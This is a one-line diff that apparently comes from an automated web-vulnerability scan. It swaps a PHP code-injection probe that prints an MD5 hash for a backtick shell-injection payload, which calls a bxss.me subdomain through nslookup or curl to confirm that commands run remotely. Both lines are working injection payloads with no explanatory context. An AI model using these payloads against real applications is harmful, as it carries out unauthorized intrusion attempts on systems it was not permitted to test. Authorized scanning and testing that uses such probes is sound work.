@@ -1,1 +1,1 @@
-'.print(md5(31337)).'
+`(nslookup -q=cname hiteauxqjzbht31393.bxss.me||curl hiteauxqjzbht31393.bxss.me)`
